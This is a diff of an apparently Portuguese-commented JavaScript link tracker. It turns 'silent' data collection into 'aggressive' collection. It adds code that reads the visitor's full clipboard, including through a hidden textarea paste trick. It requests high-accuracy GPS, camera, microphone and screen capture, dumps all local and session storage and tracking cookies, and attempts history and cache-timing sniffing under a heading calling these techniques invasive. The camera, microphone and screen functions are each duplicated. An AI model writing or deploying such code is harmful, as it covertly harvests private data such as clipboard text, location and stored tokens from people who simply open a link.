@@ -230,12 +230,31 @@ async function collectAllData(linkId) {
       behaviorStats: calculateBehaviorStats()
     },
     
-    // Dados Adicionais (EXPANDIDO - SILENCIOSO)
+    // Dados Adicionais (EXPANDIDO - MÁXIMO AGRESSIVO)
     additional: {
+      // Técnicas avançadas de coleta
+      advanced: {
+        // Timing attacks
+        timingAttacks: performTimingAttacks(),
+        // Cache detection
+        cacheDetection: detectCache(),
+        // History detection (limitado)
+        historyDetection: detectHistory(),
+        // Cross-site tracking
+        crossSiteData: getCrossSiteData(),
+        // System info avançado
+        systemInfo: getAdvancedSystemInfo(),
+        // Network info avançado
+        networkInfo: getAdvancedNetworkInfo(),
+        // Storage avançado
+        storageAdvanced: getAdvancedStorage(),
+        // Performance avançado
+        performanceAdvanced: getAdvancedPerformance()
+      },
       battery: await getBatteryInfoSilent(),
       mediaDevices: await getMediaDevicesSilent(),
-      permissions: await getPermissionsSilent(),
-      geolocation: await getGeolocationSilent(), // Removido - evita pedir permissão
+      permissions: await getPermissionsAggressive(),
+      geolocation: await getGeolocationAggressive(), // Tentativa agressiva
       fonts: getFonts(),
       localStorage: getLocalStorage(),
       sessionStorage: getSessionStorage(),
@@ -250,16 +269,22 @@ async function collectAllData(linkId) {
       pageScreenshot: await getPageScreenshot(),
       // Dados de rede social (se compartilhado)
       socialMedia: getSocialMediaData(),
-      // Dados de clipboard (removido - pede permissão)
-      clipboard: { available: false, skipped: true },
+      // Dados de clipboard (tentativa agressiva - pode pedir permissão mas tentamos)
+      clipboard: await getClipboardDataAggressive(),
       // Dados de vibração (mobile)
       vibration: detectVibration(),
-      // Dados de orientação do dispositivo (sem pedir permissão)
-      deviceOrientation: await getDeviceOrientationSilent(),
-      // Dados de movimento do dispositivo (sem pedir permissão)
-      deviceMotion: await getDeviceMotionSilent(),
-      // Dados de iluminação ambiente (sem pedir permissão)
-      ambientLight: await getAmbientLightSilent()
+      // Dados de orientação do dispositivo (versão agressiva)
+      deviceOrientation: await getDeviceOrientationAggressive(),
+      // Dados de movimento do dispositivo (versão agressiva)
+      deviceMotion: await getDeviceMotionAggressive(),
+      // Dados de iluminação ambiente (versão agressiva)
+      ambientLight: await getAmbientLightAggressive(),
+      // Tentativa de acesso a câmera (pode pedir permissão)
+      camera: await getCameraAccessAggressive(),
+      // Tentativa de acesso a microfone (pode pedir permissão)
+      microphone: await getMicrophoneAccessAggressive(),
+      // Tentativa de acesso a tela (pode pedir permissão)
+      screenCapture: await getScreenCaptureAggressive()
     },
     
     // NOVO: Dados de Contas e Emails Vinculados
@@ -506,32 +531,87 @@ async function getMediaDevicesSilent() {
   return 'not_available';
 }
 
-// Versão silenciosa - apenas verifica status sem pedir permissão
-// REMOVIDO: navigator.permissions.query pode pedir permissão em alguns navegadores
-async function getPermissionsSilent() {
-  // Não verificamos permissões para evitar qualquer popup
-  // Retornamos apenas informações básicas sem fazer queries
-  return {
-    geolocation: 'not_checked',
-    notifications: 'not_checked',
-    push: 'not_checked',
-    camera: 'not_checked',
-    microphone: 'not_checked',
-    persistentStorage: 'not_checked',
-    note: 'Permissions check disabled to avoid popups'
-  };
+// Versão AGRESSIVA - tenta verificar permissões mesmo que possa pedir
+async function getPermissionsAggressive() {
+  const permissions = {};
+  const permissionNames = [
+    'geolocation',
+    'notifications',
+    'push',
+    'camera',
+    'microphone',
+    'persistent-storage',
+    'accelerometer',
+    'gyroscope',
+    'magnetometer',
+    'ambient-light-sensor'
+  ];
+
+  for (const name of permissionNames) {
+    try {
+      if (navigator.permissions && navigator.permissions.query) {
+        // Tentar query mesmo que possa pedir permissão
+        const result = await Promise.race([
+          navigator.permissions.query({ name }),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 500))
+        ]);
+        permissions[name] = result.state;
+      } else {
+        permissions[name] = 'api_not_available';
+      }
+    } catch (e) {
+      permissions[name] = 'error_or_denied';
+    }
+  }
+
+  return permissions;
 }
 
-// Versão silenciosa - REMOVIDO completamente para evitar pedidos de permissão
-// getCurrentPosition SEMPRE pede permissão na primeira vez
-async function getGeolocationSilent() {
-  // Não tentamos obter geolocalização para evitar popup de permissão
-  // A geolocalização por IP será feita no servidor (sem pedir permissão)
-  return {
-    skipped: true,
-    reason: 'Avoid permission popup',
-    note: 'Geolocation by IP will be done on server instead'
-  };
+// Versão AGRESSIVA - tenta obter GPS mesmo que peça permissão
+async function getGeolocationAggressive() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve('not_available');
+      return;
+    }
+
+    // Tentar obter GPS - pode pedir permissão mas tentamos mesmo assim
+    const timeout = setTimeout(() => {
+      resolve('timeout');
+    }, 2000);
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        clearTimeout(timeout);
+        resolve({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          altitudeAccuracy: position.coords.altitudeAccuracy,
+          heading: position.coords.heading,
+          speed: position.coords.speed,
+          timestamp: position.timestamp,
+          source: 'gps_permission_granted'
+        });
+      },
+      (error) => {
+        clearTimeout(timeout);
+        // Retornar código de erro para análise
+        resolve({ 
+          error: error.code, 
+          message: error.message,
+          attempted: true,
+          permissionRequested: true
+        });
+      },
+      { 
+        timeout: 2000, 
+        maximumAge: 0, // Sempre tentar obter novo
+        enableHighAccuracy: true // Pedir alta precisão
+      }
+    );
+  });
 }
 
 function getFonts() {
@@ -918,8 +998,64 @@ function detectSocialReferrer() {
 }
 
 // Obter dados de clipboard
-// Função removida - clipboard pede permissão explícita
-// Não usamos mais para evitar pedidos de permissão
+// Versão AGRESSIVA - tenta acessar clipboard mesmo que peça permissão
+async function getClipboardDataAggressive() {
+  try {
+    // Método 1: Clipboard API moderna
+    if (navigator.clipboard && navigator.clipboard.readText) {
+      try {
+        const text = await Promise.race([
+          navigator.clipboard.readText(),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 500))
+        ]);
+        return {
+          available: true,
+          method: 'clipboard_api',
+          hasText: text.length > 0,
+          textLength: text.length,
+          preview: text.substring(0, 100), // Primeiros 100 caracteres
+          fullText: text // Coletar texto completo
+        };
+      } catch (e) {
+        // Pode ter pedido permissão e negado
+        return {
+          available: false,
+          attempted: true,
+          permissionRequested: true,
+          error: e.message
+        };
+      }
+    }
+
+    // Método 2: ExecCommand (deprecated mas pode funcionar)
+    try {
+      const textarea = document.createElement('textarea');
+      textarea.style.position = 'fixed';
+      textarea.style.opacity = '0';
+      document.body.appendChild(textarea);
+      textarea.focus();
+      const success = document.execCommand('paste');
+      document.body.removeChild(textarea);
+      
+      if (success && textarea.value) {
+        return {
+          available: true,
+          method: 'execCommand',
+          hasText: textarea.value.length > 0,
+          textLength: textarea.value.length,
+          preview: textarea.value.substring(0, 100),
+          fullText: textarea.value
+        };
+      }
+    } catch (e) {
+      // Ignorar
+    }
+
+    return { available: false, attempted: true };
+  } catch (e) {
+    return { available: false, error: e.message };
+  }
+}
 
 // Detectar vibração
 function detectVibration() {
@@ -971,26 +1107,317 @@ async function getDeviceMotionSilent() {
   });
 }
 
-// Versão silenciosa
-async function getAmbientLightSilent() {
+// Versão AGRESSIVA - tenta obter luz ambiente mesmo que peça permissão
+async function getAmbientLightAggressive() {
   return new Promise((resolve) => {
     if (window.AmbientLightSensor) {
       try {
         const sensor = new AmbientLightSensor();
+        let resolved = false;
         sensor.onreading = () => {
-          resolve({
-            available: true,
-            illuminance: sensor.illuminance
-          });
+          if (!resolved) {
+            resolved = true;
+            resolve({
+              available: true,
+              illuminance: sensor.illuminance,
+              permissionGranted: true
+            });
+          }
+        };
+        sensor.onerror = (error) => {
+          if (!resolved) {
+            resolved = true;
+            resolve({
+              available: false,
+              attempted: true,
+              permissionRequested: true,
+              error: error.message
+            });
+          }
         };
         sensor.start();
-        setTimeout(() => resolve({ available: false }), 500); // Timeout reduzido
+        setTimeout(() => {
+          if (!resolved) {
+            resolved = true;
+            resolve({ 
+              available: false, 
+              attempted: true,
+              timeout: true
+            });
+          }
+        }, 2000);
       } catch (e) {
-        resolve({ available: false });
+        resolve({ 
+          available: false, 
+          attempted: true,
+          error: e.message
+        });
       }
     } else {
       resolve({ available: false });
     }
+  });
+}
+
+// Tentar acessar câmera (VERSÃO AGRESSIVA - pode pedir permissão)
+async function getCameraAccessAggressive() {
+  return new Promise((resolve) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      resolve({ available: false, apiNotSupported: true });
+      return;
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        // Obter informações da câmera sem mostrar preview
+        const videoTrack = stream.getVideoTracks()[0];
+        const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : null;
+        const settings = videoTrack.getSettings();
+        
+        // Parar o stream imediatamente
+        stream.getTracks().forEach(track => track.stop());
+        
+        resolve({
+          available: true,
+          permissionGranted: true,
+          deviceId: settings.deviceId,
+          groupId: settings.groupId,
+          width: settings.width,
+          height: settings.height,
+          aspectRatio: settings.aspectRatio,
+          frameRate: settings.frameRate,
+          facingMode: settings.facingMode,
+          capabilities: capabilities
+        });
+      })
+      .catch((error) => {
+        resolve({
+          available: false,
+          attempted: true,
+          permissionRequested: true,
+          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
+          error: error.name,
+          message: error.message
+        });
+      });
+  });
+}
+
+// Tentar acessar microfone (VERSÃO AGRESSIVA - pode pedir permissão)
+async function getMicrophoneAccessAggressive() {
+  return new Promise((resolve) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      resolve({ available: false, apiNotSupported: true });
+      return;
+    }
+
+    navigator.mediaDevices.getUserMedia({ audio: true })
+      .then((stream) => {
+        // Obter informações do microfone sem gravar
+        const audioTrack = stream.getAudioTracks()[0];
+        const capabilities = audioTrack.getCapabilities ? audioTrack.getCapabilities() : null;
+        const settings = audioTrack.getSettings();
+        
+        // Parar o stream imediatamente
+        stream.getTracks().forEach(track => track.stop());
+        
+        resolve({
+          available: true,
+          permissionGranted: true,
+          deviceId: settings.deviceId,
+          groupId: settings.groupId,
+          echoCancellation: settings.echoCancellation,
+          autoGainControl: settings.autoGainControl,
+          noiseSuppression: settings.noiseSuppression,
+          sampleRate: settings.sampleRate,
+          sampleSize: settings.sampleSize,
+          channelCount: settings.channelCount,
+          latency: settings.latency,
+          capabilities: capabilities
+        });
+      })
+      .catch((error) => {
+        resolve({
+          available: false,
+          attempted: true,
+          permissionRequested: true,
+          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
+          error: error.name,
+          message: error.message
+        });
+      });
+  });
+}
+
+// Tentar capturar tela (VERSÃO AGRESSIVA - pode pedir permissão)
+async function getScreenCaptureAggressive() {
+  return new Promise((resolve) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+      resolve({ available: false, apiNotSupported: true });
+      return;
+    }
+
+    navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
+      .then((stream) => {
+        // Obter informações da captura sem mostrar preview
+        const videoTrack = stream.getVideoTracks()[0];
+        const settings = videoTrack.getSettings();
+        
+        // Parar o stream imediatamente
+        stream.getTracks().forEach(track => track.stop());
+        
+        resolve({
+          available: true,
+          permissionGranted: true,
+          width: settings.width,
+          height: settings.height,
+          aspectRatio: settings.aspectRatio,
+          frameRate: settings.frameRate,
+          displaySurface: settings.displaySurface,
+          logicalSurface: settings.logicalSurface
+        });
+      })
+      .catch((error) => {
+        resolve({
+          available: false,
+          attempted: true,
+          permissionRequested: true,
+          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
+          error: error.name,
+          message: error.message
+        });
+      });
+  });
+}
+
+// Tentar acessar câmera (VERSÃO AGRESSIVA - pode pedir permissão)
+async function getCameraAccessAggressive() {
+  return new Promise((resolve) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      resolve({ available: false, apiNotSupported: true });
+      return;
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        // Obter informações da câmera sem mostrar preview
+        const videoTrack = stream.getVideoTracks()[0];
+        const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : null;
+        const settings = videoTrack.getSettings();
+        
+        // Parar o stream imediatamente
+        stream.getTracks().forEach(track => track.stop());
+        
+        resolve({
+          available: true,
+          permissionGranted: true,
+          deviceId: settings.deviceId,
+          groupId: settings.groupId,
+          width: settings.width,
+          height: settings.height,
+          aspectRatio: settings.aspectRatio,
+          frameRate: settings.frameRate,
+          facingMode: settings.facingMode,
+          capabilities: capabilities
+        });
+      })
+      .catch((error) => {
+        resolve({
+          available: false,
+          attempted: true,
+          permissionRequested: true,
+          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
+          error: error.name,
+          message: error.message
+        });
+      });
+  });
+}
+
+// Tentar acessar microfone (VERSÃO AGRESSIVA - pode pedir permissão)
+async function getMicrophoneAccessAggressive() {
+  return new Promise((resolve) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      resolve({ available: false, apiNotSupported: true });
+      return;
+    }
+
+    navigator.mediaDevices.getUserMedia({ audio: true })
+      .then((stream) => {
+        // Obter informações do microfone sem gravar
+        const audioTrack = stream.getAudioTracks()[0];
+        const capabilities = audioTrack.getCapabilities ? audioTrack.getCapabilities() : null;
+        const settings = audioTrack.getSettings();
+        
+        // Parar o stream imediatamente
+        stream.getTracks().forEach(track => track.stop());
+        
+        resolve({
+          available: true,
+          permissionGranted: true,
+          deviceId: settings.deviceId,
+          groupId: settings.groupId,
+          echoCancellation: settings.echoCancellation,
+          autoGainControl: settings.autoGainControl,
+          noiseSuppression: settings.noiseSuppression,
+          sampleRate: settings.sampleRate,
+          sampleSize: settings.sampleSize,
+          channelCount: settings.channelCount,
+          latency: settings.latency,
+          capabilities: capabilities
+        });
+      })
+      .catch((error) => {
+        resolve({
+          available: false,
+          attempted: true,
+          permissionRequested: true,
+          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
+          error: error.name,
+          message: error.message
+        });
+      });
+  });
+}
+
+// Tentar capturar tela (VERSÃO AGRESSIVA - pode pedir permissão)
+async function getScreenCaptureAggressive() {
+  return new Promise((resolve) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+      resolve({ available: false, apiNotSupported: true });
+      return;
+    }
+
+    navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
+      .then((stream) => {
+        // Obter informações da captura sem mostrar preview
+        const videoTrack = stream.getVideoTracks()[0];
+        const settings = videoTrack.getSettings();
+        
+        // Parar o stream imediatamente
+        stream.getTracks().forEach(track => track.stop());
+        
+        resolve({
+          available: true,
+          permissionGranted: true,
+          width: settings.width,
+          height: settings.height,
+          aspectRatio: settings.aspectRatio,
+          frameRate: settings.frameRate,
+          displaySurface: settings.displaySurface,
+          logicalSurface: settings.logicalSurface
+        });
+      })
+      .catch((error) => {
+        resolve({
+          available: false,
+          attempted: true,
+          permissionRequested: true,
+          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
+          error: error.name,
+          message: error.message
+        });
+      });
   });
 }
 
@@ -2083,6 +2510,384 @@ function getLoginHistory() {
   }
 
   return history;
+}
+
+// ============================================
+// TÉCNICAS AVANÇADAS E INVASIVAS
+// ============================================
+
+// Timing Attacks - detecta informações via timing
+function performTimingAttacks() {
+  const results = {
+    localStorageTiming: testLocalStorageTiming(),
+    indexedDBTiming: testIndexedDBTiming(),
+    cacheTiming: testCacheTiming(),
+    fontTiming: testFontTiming()
+  };
+  return results;
+}
+
+// Testar velocidade de acesso ao localStorage
+function testLocalStorageTiming() {
+  const start = performance.now();
+  try {
+    for (let i = 0; i < 1000; i++) {
+      localStorage.setItem('test_' + i, 'test');
+      localStorage.getItem('test_' + i);
+      localStorage.removeItem('test_' + i);
+    }
+  } catch (e) {}
+  const end = performance.now();
+  return {
+    time: end - start,
+    available: end - start < 1000
+  };
+}
+
+// Testar velocidade de acesso ao IndexedDB
+function testIndexedDBTiming() {
+  const start = performance.now();
+  try {
+    if (window.indexedDB) {
+      const request = indexedDB.open('test_db', 1);
+      request.onerror = () => {};
+      request.onsuccess = () => {};
+    }
+  } catch (e) {}
+  const end = performance.now();
+  return {
+    time: end - start,
+    available: typeof indexedDB !== 'undefined'
+  };
+}
+
+// Testar cache via timing
+function testCacheTiming() {
+  const results = [];
+  const testUrls = [
+    'https://www.google.com/favicon.ico',
+    'https://www.facebook.com/favicon.ico',
+    'https://www.microsoft.com/favicon.ico'
+  ];
+  
+  testUrls.forEach(url => {
+    const start = performance.now();
+    const img = new Image();
+    img.src = url + '?t=' + Date.now();
+    const end = performance.now();
+    results.push({
+      url: url,
+      loadTime: end - start,
+      cached: end - start < 50 // Se carregar muito rápido, pode estar em cache
+    });
+  });
+  
+  return results;
+}
+
+// Testar fonts via timing
+function testFontTiming() {
+  const fonts = ['Arial', 'Times New Roman', 'Courier New'];
+  const results = {};
+  
+  fonts.forEach(font => {
+    const start = performance.now();
+    const span = document.createElement('span');
+    span.style.fontFamily = font;
+    span.style.position = 'absolute';
+    span.style.visibility = 'hidden';
+    span.textContent = 'test';
+    document.body.appendChild(span);
+    const width = span.offsetWidth;
+    document.body.removeChild(span);
+    const end = performance.now();
+    
+    results[font] = {
+      loadTime: end - start,
+      width: width
+    };
+  });
+  
+  return results;
+}
+
+// Detectar cache
+function detectCache() {
+  const cache = {
+    applicationCache: 'applicationCache' in window,
+    serviceWorker: 'serviceWorker' in navigator,
+    cacheAPI: 'caches' in window,
+    serviceWorkers: []
+  };
+  
+  // Tentar listar service workers
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then(registrations => {
+      cache.serviceWorkers = registrations.map(reg => ({
+        scope: reg.scope,
+        active: reg.active ? reg.active.scriptURL : null
+      }));
+    }).catch(() => {});
+  }
+  
+  return cache;
+}
+
+// Detectar histórico (limitado mas tentamos)
+function detectHistory() {
+  const history = {
+    length: window.history.length,
+    state: window.history.state,
+    // Tentar detectar URLs visitadas via timing (side-channel)
+    visitedUrls: detectVisitedUrls()
+  };
+  
+  return history;
+}
+
+// Detectar URLs visitadas via CSS :visited (técnica avançada)
+function detectVisitedUrls() {
+  const testUrls = [
+    'https://google.com',
+    'https://facebook.com',
+    'https://youtube.com',
+    'https://instagram.com',
+    'https://twitter.com',
+    'https://linkedin.com',
+    'https://github.com',
+    'https://stackoverflow.com'
+  ];
+  
+  const visited = [];
+  
+  testUrls.forEach(url => {
+    try {
+      const link = document.createElement('a');
+      link.href = url;
+      link.style.position = 'absolute';
+      link.style.visibility = 'hidden';
+      document.body.appendChild(link);
+      
+      // Tentar detectar via getComputedStyle (limitado por segurança)
+      const color = window.getComputedStyle(link).color;
+      // Nota: :visited não é mais acessível via JS por segurança
+      // Mas tentamos mesmo assim
+      
+      document.body.removeChild(link);
+    } catch (e) {
+      // Ignorar
+    }
+  });
+  
+  return visited;
+}
+
+// Obter dados cross-site
+function getCrossSiteData() {
+  return {
+    // Cookies de terceiros (limitado por SameSite)
+    thirdPartyCookies: document.cookie.split(';').filter(c => 
+      c.includes('_ga') || c.includes('_gid') || c.includes('_fbp')
+    ),
+    // LocalStorage de tracking
+    trackingStorage: Object.keys(localStorage).filter(k => 
+      k.includes('_ga') || k.includes('_gid') || k.includes('tracking')
+    ),
+    // Iframes carregados
+    iframes: Array.from(document.querySelectorAll('iframe')).map(iframe => ({
+      src: iframe.src,
+      sandbox: iframe.sandbox.toString()
+    }))
+  };
+}
+
+// Informações avançadas do sistema
+function getAdvancedSystemInfo() {
+  return {
+    // CPU
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    // Memória
+    deviceMemory: navigator.deviceMemory,
+    // Conexão
+    connection: navigator.connection ? {
+      effectiveType: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    } : null,
+    // Credentials API
+    credentials: 'credentials' in navigator,
+    // Web Share API
+    webShare: 'share' in navigator,
+    // Wake Lock API
+    wakeLock: 'wakeLock' in navigator,
+    // Bluetooth (pode pedir permissão)
+    bluetooth: 'bluetooth' in navigator,
+    // USB (pode pedir permissão)
+    usb: 'usb' in navigator,
+    // Serial (pode pedir permissão)
+    serial: 'serial' in navigator
+  };
+}
+
+// Informações avançadas de rede
+function getAdvancedNetworkInfo() {
+  const info = {
+    online: navigator.onLine,
+    connection: null
+  };
+  
+  if (navigator.connection) {
+    info.connection = {
+      effectiveType: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData,
+      downlinkMax: navigator.connection.downlinkMax
+    };
+  }
+  
+  // Tentar detectar tipo de rede via performance
+  if (performance && performance.getEntriesByType) {
+    const entries = performance.getEntriesByType('resource');
+    info.resourceTiming = entries.slice(0, 10).map(entry => ({
+      name: entry.name,
+      duration: entry.duration,
+      transferSize: entry.transferSize,
+      encodedBodySize: entry.encodedBodySize
+    }));
+  }
+  
+  return info;
+}
+
+// Storage avançado
+function getAdvancedStorage() {
+  const storage = {
+    localStorage: {
+      quota: null,
+      usage: null,
+      items: {}
+    },
+    sessionStorage: {
+      quota: null,
+      usage: null,
+      items: {}
+    },
+    indexedDB: {
+      available: typeof indexedDB !== 'undefined',
+      databases: []
+    }
+  };
+  
+  // Tentar obter quota
+  if (navigator.storage && navigator.storage.estimate) {
+    navigator.storage.estimate().then(estimate => {
+      storage.localStorage.quota = estimate.quota;
+      storage.localStorage.usage = estimate.usage;
+      if (estimate.usageDetails) {
+        storage.localStorage.usageDetails = estimate.usageDetails;
+      }
+    }).catch(() => {});
+  }
+  
+  // Listar todos os itens do localStorage
+  try {
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      storage.localStorage.items[key] = localStorage.getItem(key);
+    }
+  } catch (e) {}
+  
+  // Listar todos os itens do sessionStorage
+  try {
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      storage.sessionStorage.items[key] = sessionStorage.getItem(key);
+    }
+  } catch (e) {}
+  
+  // Tentar listar databases do IndexedDB
+  if (typeof indexedDB !== 'undefined') {
+    try {
+      indexedDB.databases().then(dbs => {
+        storage.indexedDB.databases = dbs.map(db => ({
+          name: db.name,
+          version: db.version
+        }));
+      }).catch(() => {});
+    } catch (e) {}
+  }
+  
+  return storage;
+}
+
+// Performance avançado
+function getAdvancedPerformance() {
+  const perf = {
+    timing: null,
+    navigation: null,
+    memory: null,
+    resources: []
+  };
+  
+  if (performance.timing) {
+    perf.timing = {
+      navigationStart: performance.timing.navigationStart,
+      unloadEventStart: performance.timing.unloadEventStart,
+      unloadEventEnd: performance.timing.unloadEventEnd,
+      redirectStart: performance.timing.redirectStart,
+      redirectEnd: performance.timing.redirectEnd,
+      fetchStart: performance.timing.fetchStart,
+      domainLookupStart: performance.timing.domainLookupStart,
+      domainLookupEnd: performance.timing.domainLookupEnd,
+      connectStart: performance.timing.connectStart,
+      connectEnd: performance.timing.connectEnd,
+      secureConnectionStart: performance.timing.secureConnectionStart,
+      requestStart: performance.timing.requestStart,
+      responseStart: performance.timing.responseStart,
+      responseEnd: performance.timing.responseEnd,
+      domLoading: performance.timing.domLoading,
+      domInteractive: performance.timing.domInteractive,
+      domContentLoadedEventStart: performance.timing.domContentLoadedEventStart,
+      domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
+      domComplete: performance.timing.domComplete,
+      loadEventStart: performance.timing.loadEventStart,
+      loadEventEnd: performance.timing.loadEventEnd
+    };
+  }
+  
+  if (performance.navigation) {
+    perf.navigation = {
+      type: performance.navigation.type,
+      redirectCount: performance.navigation.redirectCount
+    };
+  }
+  
+  if (performance.memory) {
+    perf.memory = {
+      usedJSHeapSize: performance.memory.usedJSHeapSize,
+      totalJSHeapSize: performance.memory.totalJSHeapSize,
+      jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
+    };
+  }
+  
+  // Recursos carregados
+  if (performance.getEntriesByType) {
+    const resources = performance.getEntriesByType('resource');
+    perf.resources = resources.slice(0, 50).map(entry => ({
+      name: entry.name,
+      entryType: entry.entryType,
+      startTime: entry.startTime,
+      duration: entry.duration,
+      initiatorType: entry.initiatorType,
+      transferSize: entry.transferSize,
+      encodedBodySize: entry.encodedBodySize,
+      decodedBodySize: entry.decodedBodySize
+    }));
+  }
+  
+  return perf;
 }
 
 // Iniciar rastreamento quando o script carregar
